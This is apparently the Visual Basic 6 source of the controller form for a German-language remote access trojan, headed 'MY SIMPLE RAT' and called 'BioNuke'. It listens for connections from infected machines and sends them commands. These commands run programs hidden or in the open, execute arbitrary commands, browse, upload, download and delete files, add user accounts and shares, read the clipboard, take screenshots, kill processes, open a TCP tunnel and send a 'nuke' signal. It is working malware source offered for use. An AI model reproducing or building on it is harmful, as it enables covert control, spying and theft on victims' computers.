         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "frmMain.frx":AB5A
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
   End
   Begin MSComctlLib.TreeView ListMenu 
      Height          =   7095
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   3615
      _ExtentX        =   6376
      _ExtentY        =   12515
      _Version        =   393217
      Indentation     =   441
      LabelEdit       =   1
      LineStyle       =   1
      Style           =   7
      FullRowSelect   =   -1  'True
      ImageList       =   "ImageList1"
      BorderStyle     =   1
      Appearance      =   1
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin VB.Frame Frame 
      BorderStyle     =   0  'Kein
      Caption         =   "Frame1"
      Height          =   7095
      Index           =   0
      Left            =   3600
      TabIndex        =   2
      Top             =   0
      Width           =   7215
      Begin VB.TextBox Text 
         Alignment       =   2  'Zentriert
         Height          =   1455
         Index           =   0
         Left            =   240
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         TabIndex        =   165
         Text            =   "frmMain.frx":AB76
         Top             =   5400
         Width           =   6495
      End
      Begin VB.Label Label2 
         BackColor       =   &H00000000&
         BeginProperty Font 
            Name            =   "Calisto MT"
            Size            =   15.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000FF00&
         Height          =   1575
         Left            =   0
         TabIndex        =   164
         Top             =   5400
         Width           =   7215
      End
      Begin VB.Image Image2 
         Height          =   5625
         Left            =   0
         Picture         =   "frmMain.frx":AB7C
         Stretch         =   -1  'True
         Top             =   0
         Width           =   7215
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'#########################################'
'#########################################'
'##                                     ##'
'##          MY SIMPLE RAT :)           ##'
'##                                     ##'
'##             28.11.2004              ##'
'##                                     ##'
'##   ~ RIPPING SUCKX ~                 ##'
'##                                     ##'
'##       -> SNIPER109 <-               ##'
'##                                     ##'
'## irc.quakenet.org @ #sniper109       ##'
'#########################################'
'#########################################'


Private Sub Button_Click(Index As Integer)
    On Error Resume Next
    Dim temp As String
    Select Case Index
        Case 0: List(0).Clear
        Case 1: CreateServer
        Case 2: Status "Setze neues Skin...", "Wait": SaveSetting "BioNuke", "options", "style", List(1).Text & ".ini": StyleME: Status "Neues Skin gesetzt!", "Idle": MsgBox "Neues Skin """ & GetStyle("copyright", "name") & """ von " & GetStyle("copyright", "autor") & " wurde übernommen!", vbInformation
        Case 3: Text(8) = Text(8) & Server.Chatname & ": " & Text(9) & vbCrLf: Senden Server.Index, CMD_CHAT & Server.Chatname & ": " & Text(9): Text(9) = ""
        Case 4: temp = InputBox("Eigener Chatna'me", , "Master"): If temp <> "" Then Status "Starte Chat....", "Wait": Server.Chatname = temp: Senden Server.Index, CMD_CHAT & MasterSplit
        Case 5: Status "Schließe Chat...", "Wait": Senden Server.Index, CMD_CHAT & MasterSplit & MasterSplit
        Case 6: Status "Tasten werden simuliert...", "Wait": Senden Server.Index, CMD_SENDKEYS & Text(10)
        Case 7: MsgBox "Variablenliste für Remote Tastatur" & vbCrLf & vbCrLf & "^" & vbTab & vbTab & "STRG" & vbCrLf & "%" & vbTab & vbTab & "ALT" & vbCrLf & "{enter}" & vbTab & vbTab & "Enter" & vbCrLf & "{F1}" & vbTab & vbTab & "F1" & vbCrLf & "{ESC}" & vbTab & vbTab & "Escape" & vbCrLf & "{backspace}" & vbTab & "Backspace" & vbCrLf & "ABC..." & vbTab & vbTab & "ABC...", vbInformation
        Case 8: Senden Server.Index, CMD_INPUTBOX & Text(11) & MasterSplit & Text(12) & MasterSplit & Text(13): Status "Fragebox gesendet, warte auf Antwort...", "Wait"
        Case 9: Text(14) = InputBox(Text(12), Text(11), Text(13))
        Case 10: If Button(10).Caption = "Login" Then Login Else Status "Logout...", "Wait": Senden Server.Index, CMD_LOGIN & "0"
        Case 11: wsk(0).LocalPort = Text(15): wsk(0).Close: wsk(0).Listen: Button(11).Enabled = False
        Case 12: Status "Nachricht wird erzeugt...", "Wait": Senden Server.Index, CMD_MSG & Text(18) & MasterSplit & Text(19) & MasterSplit & Combo(3).ListIndex & MasterSplit & Combo(2).ListIndex
        Case 13: Msg
        Case 14: Status "Empfange Favoriten...", "Wait": Senden Server.Index, CMD_FAV & MasterSplit
        Case 15: Status "Favorit wird neu angelegt...", "Wait": Senden Server.Index, CMD_FAV & "#" & Text(16) & MasterSplit & Text(17)
        Case 16: Status "Favorit wird gelöscht...", "Wait": Senden Server.Index, CMD_FAV & "*" & List(2).List(List(2).ListIndex)
        Case 17: Status "Ändere ziel von """ & List(2).List(List(2).ListIndex) & """...", "Wait": Senden Server.Index, CMD_FAV & "~" & List(2).List(List(2).ListIndex) & MasterSplit & Text(17)
        Case 18: Status "Empfange installierte Services....", "Wait": Senden Server.Index, CMD_SERVICES
        Case 19: Status "Empfange Freigaben....", "Wait": Senden Server.Index, CMD_SHARE
        Case 20: Status "Empfange Benutzerkonten....", "Wait": Senden Server.Index, CMD_USER
        Case 21: Status "Freigabe wird eingerichtet...", "Wait": Senden Server.Index, CMD_SHARE2 & Text(20) & MasterSplit & Text(21) & MasterSplit & Check(7).Tag
        Case 22: Status "Freigabe wird gelöscht...", "Wait": Senden Server.Index, CMD_SHARE2 & Text(23) & MasterSplit & "/DELETE"
        Case 23: Status "Benutzer wird eingerichtet...", "Wait": Senden Server.Index, CMD_USER2 & Text(27) & MasterSplit & Text(26)
        Case 24: Status "Benutzer wird gelöscht...", "Wait": Senden Server.Index, CMD_USER2 & Text(24) & MasterSplit & "/DELETE"
        Case 25: Status "Druckauftrag wird gestartet...", "Wait": Senden Server.Index, CMD_PRINT & Check(8).Value & MasterSplit & Check(9).Value & MasterSplit & Check(10).Value & MasterSplit & Check(11).Value & MasterSplit & Text(29) & MasterSplit & Text(28) & MasterSplit & Text(25)
        Case 26: Status "Empfange Zwischenablage...", "Wait": Senden Server.Index, CMD_CLIP & MasterSplit
        Case 27: Status "Setze Zwischenablage...", "Wait": Senden Server.Index, CMD_CLIP & Text(32)
        Case 28: Status "Empfange Laufwerke...", "Wait": Senden Server.Index, CMD_FILE & MasterSplit
        Case 29: Status "Empfange Laufwerkinfo...", "Wait": Senden Server.Index, CMD_FILE & MasterSplit & MasterSplit & Left(Combo(4).Text, 1)
        Case 30: Status "Empfange Dateisystem...", "Wait": Text(30) = Replace(Text(30), "\\", "\"): Senden Server.Index, CMD_FILE & Text(30)
        Case 33: Dim tmp As String: tmp = InputBox("Neuer Name?", "Umbenennen", FileOnly(Text(30) & ListFile.SelectedItem.Text)): If tmp = "" Then Exit Sub Else Status "Umbenennung...", "Wait": Senden Server.Index, CMD_FILEMOD & "3" & MasterSplit & Text(30) & ListFile.SelectedItem.Text & MasterSplit & Text(30) & tmp
        Case 31, 32, 34, 36, 37, 38, 41, 42: ExtraFile Index
        Case 35: tmp = InputBox("Name?", "Neuer Ordner", "BioNuke"): If tmp = "" Then Exit Sub Else Status "Erstelle neuen Ordner...", "Wait": Senden Server.Index, CMD_FILEMOD & "11" & MasterSplit & Text(30) & tmp
        Case 39: frmTransfer.AddDownload Text(30) & ListFile.SelectedItem.Text
        Case 40: CommonDialog1.ShowOpen: If CommonDialog1.FileName <> "" Then frmTransfer.AddUpload CommonDialog1.FileName, Text(30) & FileOnly(CommonDialog1.FileName)
        Case 43: tmp = InputBox("Kommando?", "Kommando starten", "notepad.exe"): If tmp = "" Then Exit Sub Else Status "Führe Kommando aus...", "Wait": Senden Server.Index, CMD_FILEMOD & "1" & MasterSplit & tmp
        Case 44: If Right(Text(30), 2) = "\\" Then Text(30) = Left(Text(30), Len(Text(30)) - 1)
                 tmp = InputBox("Suchmaske?", "Suchen", "*.jpg"): If tmp = "" Then Exit Sub Else Status "Durchsuche Dateisystem...", "Wait": Senden Server.Index, CMD_FILE & Text(30) & MasterSplit & LCase(tmp): Text(30) = Text(30) & "\"
        Case 45: If ListProcess.SelectedItem.Text <> "" Then Status "Schieße Prozess ab...", "Wait": Senden Server.Index, CMD_PROCESS & ListProcess.SelectedItem.Text
        Case 46: Status "Empfange Serverinfos...", "Wait": Senden Server.Index, CMD_SERVERINFO
        Case 47, 48, 49: If MsgBox("Wirklich?", vbQuestion + vbYesNo) = vbYes Then Status Button(Index).Caption & "...", "Wait": Senden Server.Index, CMD_SERVER & (Index - 46)
        Case 50: If InStr(Text(33), ":") = 0 Then Exit Sub Else Text(34) = "*** Initialisiere Tunnel nach " & Text(33) & "...": Dim ss As Variant: ss = Split(Text(33), ":"): Status "Stabilisiere Tunnel...", "Wait": Senden Server.Index, CMD_TELNET & "1" & MasterSplit & ss(0) & MasterSplit & ss(1)
        Case 51: Status "Schließe TCP-Tunnel...", "Wait": Senden Server.Index, CMD_TELNET & "2"
        Case 52: Status "Sende Nuke-Signal...", "Wait": Senden Server.Index, CMD_NUKE
        Case 53: Status "Erstelle Screenshot...", "Wait": Senden Server.Index, CMD_SCREEN & Slider.Value
        Case 57: Status "Liste Prozesse auf...", "Wait": Senden Server.Index, CMD_PROCESS
    
    End Select
End Sub
Sub ExtraFile(ByVal Index As Integer)
    On Error Resume Next
    If ListFile.SelectedItem.SmallIcon = 12 Then Exit Sub
    Dim tAuswahl As String
    tAuswahl = Text(30) & ListFile.SelectedItem.Text

    If ListFile.SelectedItem.SmallIcon = 11 Then
        Select Case Index
            Case 36
                Status "Lösche Ordner...", "Wait": Senden Server.Index, CMD_DELDIR & tAuswahl
            Case Else
                Status "Auswahl nur für Ordner möglich!", "Idle"
        End Select
    Else
        Select Case Index
            Case 31: Status "Starte Datei...", "Wait": Senden Server.Index, CMD_FILEMOD & "1" & MasterSplit & tAuswahl
            Case 32: Status "Starte Datei (versteckt)...", "Wait": Senden Server.Index, CMD_FILEMOD & "2" & MasterSplit & tAuswahl
            Case 34: Status "Lösche Datei...", "Wait": Senden Server.Index, CMD_FILEMOD & "4" & MasterSplit & tAuswahl
            Case 37: If ListFile.SelectedItem.SmallIcon <> 13 Then Exit Sub Else Status "Drucke Bild...", "Wait": Senden Server.Index, CMD_FILEMOD & "5" & MasterSplit & tAuswahl
            Case 38: If ListFile.SelectedItem.SmallIcon <> 13 Then Exit Sub Else Status "Setze Hintergrund...", "Wait": Senden Server.Index, CMD_FILEMOD & "10" & MasterSplit & tAuswahl
            Case 41: Status "Empfange Dateigröße...", "Wait": Senden Server.Index, CMD_FILEMOD & "8" & MasterSplit & tAuswahl
            Case 42: If ListFile.SelectedItem.SmallIcon <> 13 Then Exit Sub Else Status "Zeige Bild an...", "Wait": Senden Server.Index, CMD_FILEMOD & "9" & MasterSplit & tAuswahl
            Case Else
                Status "Auswahl nur für Ordner möglich!", "Idle"
        End Select
    End If
End Sub
Sub Msg()
    On Error Resume Next
    Select Case Combo(3).ListIndex
    Case 0: MsgBox Text(18), Combo(2).ListIndex + vbInformation, Text(19)
    Case 1: MsgBox Text(18), Combo(2).ListIndex + vbQuestion, Text(19)
    Case 2: MsgBox Text(18), Combo(2).ListIndex + vbExclamation, Text(19)
    Case 3: MsgBox Text(18), Combo(2).ListIndex + vbCritical, Text(19)
    End Select
End Sub
Sub Login()
    On Error Resume Next
                If ListSvr.SelectedItem.Index = 0 Then
                    MsgBox "Es wurde kein aktiver Server ausgewählt.", vbInformation
                Else
                    Dim tPass As String
                    tPass = InputBox("Passwort für Server """ & ListSvr.SelectedItem.SubItems(2) & """ (" & ListSvr.SelectedItem.Text & "):", , "default")
                    If tPass = "" Then Exit Sub
                    Server.Connected = False
                    Server.Index = Mid(ListSvr.SelectedItem.Key, 2)
                    Server.RemIP = ListSvr.SelectedItem.Text
                    Server.Servername = ListSvr.SelectedItem.SubItems(2)
                    Senden Mid(ListSvr.SelectedItem.Key, 2), CMD_LOGIN & tPass
                    Status "Versuche Authentifizierung...", "Log in"
                End If
End Sub

Private Sub Check_Click(Index As Integer)
If Index = 7 And Check(7).Value = 1 Then Check(Index).Tag = "/UNLIMITED" Else Check(Index).Tag = "/USERS:" & Text(22).Text
If Index = 8 Then Text(25).FontBold = Check(Index).Value
If Index = 9 Then Text(25).FontItalic = Check(Index).Value
If Index = 10 Then Text(25).FontUnderline = Check(Index).Value
If Index = 11 Then Text(25).FontStrikethru = Check(Index).Value
End Sub

Private Sub Combo_Click(Index As Integer)
    If Index = 4 Then
        If Combo(Index).Text = "" Then Exit Sub
        Text(30) = Left(Combo(Index).Text, 1) + ":\"
    End If
End Sub

Private Sub Form_Load()
    Frame(0).ZOrder
    Combo(2).AddItem "OK"
    Combo(2).AddItem "OK, Abbrechen"
    Combo(2).AddItem "Abbrechen, Wiederholen, Ignorieren"
    Combo(2).AddItem "Ja, Nein, Abbrechen"
    Combo(2).AddItem "Ja, Nein"
    Combo(2).AddItem "Wiederholen, Abbrechen"
    Combo(2).ListIndex = 0
    
    Combo(3).AddItem "Information"
    Combo(3).AddItem "Fragezeichen"
    Combo(3).AddItem "Gelbes Ausrufezeichen"
    Combo(3).AddItem "Rotes X"
    Combo(3).ListIndex = 0

    
    File1.Path = App.Path & "\Skins"
    For ii = 0 To File1.ListCount - 1
        List(1).AddItem Left(File1.List(ii), Len(File1.List(ii)) - 4)
        List(1).ListIndex = ii
    Next ii
    
    Text(0) = "Coded by SNiPER109" & vbCrLf & "--------------------------------------------------" & vbCrLf & "eMail: sniper900@gmx.de - ICQ: 284040647" & vbCrLf & _
    vbCrLf & "Special ThX & greEtZ to: hacky1312, MrHawk, Crypti, t1m0"
End Sub


Private Sub Form_Unload(Cancel As Integer)
    Unload frmTransfer
End Sub

Private Sub List_Click(Index As Integer)
    If Index = 1 Then
        Label(13) = "Name: " & GetStyle("copyright", "name", App.Path & "\Skins\" & List(1).Text & ".ini")
        Label(16) = "Autor: " & GetStyle("copyright", "autor", App.Path & "\Skins\" & List(1).Text & ".ini")
        Label(14) = "Beschreibung: " & GetStyle("copyright", "text", App.Path & "\Skins\" & List(1).Text & ".ini")
    End If
    If Index = 2 Then
        Dim tmp As Variant
        tmp = Split(ListFavs.List(List(2).ListIndex), MasterSplit)
        Text(16) = Left(FileOnly(tmp(0)), Len(FileOnly(tmp(0))) - 4)
        Text(17) = tmp(1)
    End If
End Sub

Private Sub ListFile_DblClick()
    On Error Resume Next
    
    If ListFile.SelectedItem.SmallIcon = 11 Then
        Text(30) = Text(30) & ListFile.SelectedItem.Text & "\"
    ElseIf ListFile.SelectedItem.SmallIcon = 12 Then
        Text(30) = PathBack(Text(30))
    Else
        Exit Sub
    End If
    Status "Empfange Dateisystem...", "Wait": Senden Server.Index, CMD_FILE & Text(30)
End Sub

Private Sub ListMenu_Click()
    On Error Resume Next
    Frame(Mid(ListMenu.SelectedItem.Key, 2)).ZOrder
End Sub

Private Sub ListSvr_DblClick()
    Login
End Sub

Private Sub Text_Change(Index As Integer)
    If Index = 8 Or Index = 30 Then Text(Index).SelStart = Len(Text(Index))
    
    If Index = 28 Then
        On Error GoTo formaterr
        If Text(28) = "" Then Exit Sub
        Text(25).FontSize = Val(Text(28))
    End If
    
    If Index = 29 Then
        On Error Resume Next
        Text(25).Font = Text(29)
    End If
    If Index = 34 Then Text(Index).SelStart = Len(Text(Index))
    
    Exit Sub
formaterr:
    Text(25).FontSize = 28
    Text(28) = 28
End Sub
Public Sub AddIP(ByVal tIP As String, ByVal tPC As String, ByVal tServer As String, ByVal tWindows As String, ByVal tKey As String)
        On Error Resume Next
        Dim lItem As ListItem
        Set lItem = ListSvr.ListItems.Add(, tKey, tIP, , 1)
        lItem.ListSubItems.Add , , tPC
        lItem.ListSubItems.Add , , tServer
        lItem.ListSubItems.Add , , tWindows
        Status "Server """ & tServer & """ (" & tIP & ") ist online!!"
End Sub

Public Sub DelIP(ByVal tKey As String)
    On Error Resume Next
    If Mid(tKey, 2) = Server.Index Then
            SetDisconnected
    End If
    For ii = 1 To ListSvr.ListItems.Count
        If ListSvr.ListItems(ii).Key = tKey Then
            Status "Server """ & ListSvr.ListItems(ii).SubItems(2) & """ (" & ListSvr.ListItems(ii).Text & ")  ging offline"
            ListSvr.ListItems.Remove ii
        End If
    Next ii
    
End Sub

Private Sub Text_KeyPress(Index As Integer, KeyAscii As Integer)
On Error Resume Next
If Index = 35 Then
        If KeyAscii = 13 Then
            Text(Index) = Replace(Text(Index), vbCrLf, "")
            Senden Server.Index, CMD_TELNET & "3" & MasterSplit & Text(Index)
            Text(34) = Text(34) & vbCrLf & "[" & Time & "] [CLIENT] " & Text(Index)
            Text(Index).Text = ""
        End If
End If
End Sub

Private Sub wsk_Close(Index As Integer)
    DelIP "x" & Index
End Sub

Private Sub wsk_ConnectionRequest(Index As Integer, ByVal requestID As Long)
    On Error Resume Next
    Dim LB As Long: LB = wsk.UBound + 1
    Load wsk(LB)
    With wsk(LB)
        .Close
        .Accept requestID
    End With
End Sub

Private Sub wsk_DataArrival(Index As Integer, ByVal bytesTotal As Long)
    On Error Resume Next
    Dim tmp As String
    wsk(Index).GetData tmp
    tmp = Decode(tmp)
    Me.Tag = Me.Tag & tmp
    If Right(tmp, Len(Splitter)) = Splitter Then
        tmp = Me.Tag
        Me.Tag = ""
    Else
        Exit Sub
    End If
    Dim tInData As Variant
    tInData = Split(tmp, Splitter)
    For ii = 0 To UBound(tInData)
        If tInData(ii) <> "" Then
            Dim Command As String, ReceiveData As String
            Command = Left(tInData(ii), 3)
            ReceiveData = Mid(tInData(ii), 4)
            Parse Index, Command, ReceiveData
        End If
    Next ii
End Sub

Private Sub wsk_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    DelIP "x" & Index
End Sub
